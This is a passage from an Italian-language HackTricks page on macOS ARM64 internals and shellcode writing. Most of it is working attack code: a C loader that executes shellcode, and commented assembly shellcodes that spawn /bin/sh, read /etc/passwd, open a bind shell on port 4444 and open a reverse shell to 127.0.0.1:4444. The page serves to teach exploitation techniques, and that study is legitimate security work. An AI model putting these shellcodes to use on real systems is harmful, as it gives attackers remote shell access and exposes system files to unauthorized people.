dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

{% hint style="success" %}
A volte è più facile controllare il codice **decompilato** da **`libsystem_kernel.dylib`** **piuttosto che** controllare il **codice sorgente** perché il codice di diverse chiamate di sistema (BSD e Mach) è generato tramite script (controlla i commenti nel codice sorgente) mentre nella dylib puoi trovare cosa viene chiamato.
{% endhint %}

### chiamate machdep

XNU supporta un altro tipo di chiamate chiamate dipendenti dalla macchina. Il numero di queste chiamate dipende dall'architettura e né le chiamate né i numeri sono garantiti di rimanere costanti.

### pagina comm

Questa è una pagina di memoria proprietaria del kernel che viene mappata nello spazio degli indirizzi di ogni processo utente. È destinata a rendere più veloce la transizione dalla modalità utente allo spazio kernel rispetto all'utilizzo di chiamate di sistema per servizi kernel che vengono utilizzati così tanto che questa transizione sarebbe molto inefficiente.

Ad esempio, la chiamata `gettimeofdate` legge il valore di `timeval` direttamente dalla pagina comm.

### objc\_msgSend

È molto comune trovare questa funzione utilizzata nei programmi Objective-C o Swift. Questa funzione consente di chiamare un metodo di un oggetto Objective-C.

Parametri ([più informazioni nella documentazione](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Puntatore all'istanza
* x1: op -> Selettore del metodo
* x2... -> Resto degli argomenti del metodo invocato

Quindi, se si inserisce un breakpoint prima del salto a questa funzione, è possibile trovare facilmente cosa viene invocato in lldb con (in questo esempio l'oggetto chiama un oggetto da `NSConcreteTask` che eseguirà un comando):
```
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
### Shellcodes

Per compilare:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Per estrarre i byte:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<dettagli>

<riassunto>Codice C per testare lo shellcode</riassunto>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Prelevato da [**qui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e spiegato.

{% tabs %}
{% tab title="con adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="con stack" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### Leggere con cat

L'obiettivo è eseguire `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, quindi il secondo argomento (x1) è un array di parametri (che in memoria significa uno stack degli indirizzi).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Esegui il comando con sh da una fork in modo che il processo principale non venga ucciso
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Shell di bind

Shell di bind da [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) sulla **porta 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Shell inversa

Da [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
